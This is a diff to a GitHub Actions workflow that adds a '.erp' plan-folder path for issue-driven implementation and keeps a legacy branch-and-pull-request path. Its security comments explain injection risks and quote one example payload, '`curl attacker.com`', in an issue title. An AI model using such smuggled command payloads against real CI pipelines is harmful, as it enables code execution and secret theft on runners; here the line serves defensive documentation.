@@ -56,8 +56,20 @@ jobs:
             --workflow-run-url "$WORKFLOW_RUN_URL" \
             2>/dev/null || true
 
+      - name: Check for .erp folder
+        id: check_erp
+        run: |
+          if [ -d ".erp" ]; then
+            echo "erp_exists=true" >> $GITHUB_OUTPUT
+            echo "✅ Found .erp/ folder with plan (new workflow)"
+          else
+            echo "erp_exists=false" >> $GITHUB_OUTPUT
+            echo "⚠️ No .erp/ folder found, using legacy workflow"
+          fi
+
       - name: Derive branch name from issue title
         id: branch_name
+        if: steps.check_erp.outputs.erp_exists == 'false'
         # SECURITY: Use env block to prevent code injection attacks
         # Issue titles are user-controlled and could contain malicious code like `curl attacker.com`
         # Direct interpolation (${{ github.event.issue.title }}) in shell would execute as code
@@ -80,6 +92,7 @@ jobs:
           echo "Derived branch name: $BRANCH_NAME"
 
       - name: Create and switch to branch
+        if: steps.check_erp.outputs.erp_exists == 'false'
         # SECURITY: Use env block for consistency
         # BRANCH_NAME is derived from sanitized user input (see branch derivation step)
         # Using env block maintains security best practices throughout workflow
@@ -116,7 +129,7 @@ jobs:
           git config user.name "github-actions[bot]"
           git config user.email "github-actions[bot]@users.noreply.github.com"
 
-      - name: Create plan folder
+      - name: Set up implementation folder
         # SECURITY: Use env block to prevent code injection attacks
         # Issue bodies are user-controlled and could contain:
         #   1. Heredoc terminators (EOF) to break out of cat command
@@ -128,15 +141,26 @@ jobs:
           ISSUE_BODY: ${{ github.event.issue.body }}
           ISSUE_NUMBER: ${{ github.event.issue.number }}
           ISSUE_URL: ${{ github.event.issue.html_url }}
+          ERP_EXISTS: ${{ steps.check_erp.outputs.erp_exists }}
         run: |
-          mkdir -p .impl
+          if [ "$ERP_EXISTS" = "true" ]; then
+            # Use existing .erp/ folder (new workflow)
+            echo "Using .erp/ folder from branch"
+            echo "Plan content already committed in .erp/"
 
-          # Save issue body as plan.md using printf for safety
-          # This prevents heredoc injection attacks
-          printf '%s\n' "$ISSUE_BODY" > .impl/plan.md
+            # Copy .erp/ to .impl/ for implementation
+            cp -r .erp .impl
+            echo "✓ Copied .erp/ to .impl/ for implementation"
+          else
+            # Create .impl/ folder (legacy workflow)
+            mkdir -p .impl
 
-          # Create issue.json reference using environment variables
-          cat > .impl/issue.json <<EOF
+            # Save issue body as plan.md using printf for safety
+            # This prevents heredoc injection attacks
+            printf '%s\n' "$ISSUE_BODY" > .impl/plan.md
+
+            # Create issue.json reference using environment variables
+            cat > .impl/issue.json <<EOF
           {
             "issue_number": $ISSUE_NUMBER,
             "issue_url": "$ISSUE_URL",
@@ -145,11 +169,11 @@ jobs:
           }
           EOF
 
-          # Extract steps from plan.md and create progress.md with frontmatter
-          # This uses a simple regex to find numbered steps
-          STEP_COUNT=$(grep -E '^\s*[0-9]+\.' .impl/plan.md | wc -l | tr -d ' ')
+            # Extract steps from plan.md and create progress.md with frontmatter
+            # This uses a simple regex to find numbered steps
+            STEP_COUNT=$(grep -E '^\s*[0-9]+\.' .impl/plan.md | wc -l | tr -d ' ')
 
-          cat > .impl/progress.md <<EOF
+            cat > .impl/progress.md <<EOF
           ---
           completed_steps: 0
           total_steps: $STEP_COUNT
@@ -159,10 +183,11 @@ jobs:
 
           EOF
 
-          # Extract steps and create checkboxes
-          grep -E '^\s*[0-9]+\.' .impl/plan.md | sed 's/^\s*//' | sed 's/^/- [ ] /' >> .impl/progress.md
+            # Extract steps and create checkboxes
+            grep -E '^\s*[0-9]+\.' .impl/plan.md | sed 's/^\s*//' | sed 's/^/- [ ] /' >> .impl/progress.md
 
-          echo "Created .impl/ folder structure"
+            echo "Created .impl/ folder structure"
+          fi
 
       - name: Run implementation
         id: implement
@@ -197,16 +222,52 @@ jobs:
         env:
           ISSUE_NUMBER: ${{ github.event.issue.number }}
           BRANCH_NAME: ${{ steps.branch_name.outputs.branch_name }}
+          ERP_EXISTS: ${{ steps.check_erp.outputs.erp_exists }}
         run: |
+          # Get current branch name (for new workflow where branch already exists)
+          if [ "$ERP_EXISTS" = "true" ]; then
+            CURRENT_BRANCH=$(git branch --show-current)
+          else
+            CURRENT_BRANCH="$BRANCH_NAME"
+          fi
+
           if [[ -n $(git status --porcelain) ]]; then
             git add .
             git commit -m "Implement plan from issue #$ISSUE_NUMBER"
-            git push origin "$BRANCH_NAME"
+            git push origin "$CURRENT_BRANCH"
             echo "✓ Changes committed and pushed"
             echo "changes_pushed=true" >> $GITHUB_OUTPUT
+            echo "branch_name=$CURRENT_BRANCH" >> $GITHUB_OUTPUT
           else
             echo "No changes to commit"
             echo "changes_pushed=false" >> $GITHUB_OUTPUT
+            echo "branch_name=$CURRENT_BRANCH" >> $GITHUB_OUTPUT
+          fi
+
+      - name: Clean up .erp folder
+        if: steps.check_erp.outputs.erp_exists == 'true' && steps.commit.outputs.changes_pushed == 'true'
+        env:
+          BRANCH_NAME: ${{ steps.commit.outputs.branch_name }}
+        run: |
+          # Remove .erp/ folder now that implementation is complete
+          git rm -rf .erp/
+          git commit -m "Remove temporary plan after implementation"
+          git push origin "$BRANCH_NAME"
+          echo "✓ Removed .erp/ folder"
+
+      - name: Mark PR as ready for review
+        if: steps.check_erp.outputs.erp_exists == 'true' && steps.commit.outputs.changes_pushed == 'true'
+        env:
+          BRANCH_NAME: ${{ steps.commit.outputs.branch_name }}
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          # Get PR number for current branch
+          pr_number=$(gh pr view "$BRANCH_NAME" --json number -q .number)
+          if [ -n "$pr_number" ]; then
+            gh pr ready "$pr_number"
+            echo "✓ Marked PR #$pr_number as ready for review"
+          else
+            echo "⚠️ Could not find PR for branch $BRANCH_NAME"
           fi
 
       # Token Permissions:
@@ -217,7 +278,7 @@ jobs:
       # 2. Organization settings (if in an org)
       # 3. Enterprise settings (if applicable)
       - name: Create pull request
-        if: steps.commit.outputs.changes_pushed == 'true'
+        if: steps.commit.outputs.changes_pushed == 'true' && steps.check_erp.outputs.erp_exists == 'false'
         # SECURITY: Use env block to prevent code injection attacks
         # User-controlled inputs (issue title, issue body) must not be directly interpolated
         # Direct interpolation like PR_TITLE="${{ github.event.issue.title }}" would allow:
@@ -229,14 +290,14 @@ jobs:
         env:
           ISSUE_TITLE: ${{ github.event.issue.title }}
           ISSUE_NUMBER: ${{ github.event.issue.number }}
-          BRANCH_NAME: ${{ steps.branch_name.outputs.branch_name }}
+          BRANCH_NAME: ${{ steps.commit.outputs.branch_name }}
           IMPLEMENTATION_SUCCESS: ${{ steps.implement.outputs.implementation_success }}
           SERVER_URL: ${{ github.server_url }}
           REPOSITORY: ${{ github.repository }}
           RUN_ID: ${{ github.run_id }}
           GH_TOKEN: ${{ github.token }}
         run: |
-          # Check if PR already exists
+          # Check if PR already exists (legacy workflow only)
           if gh pr view "$BRANCH_NAME" --json number &> /dev/null; then
             echo "✓ PR already exists for branch $BRANCH_NAME"
             exit 0
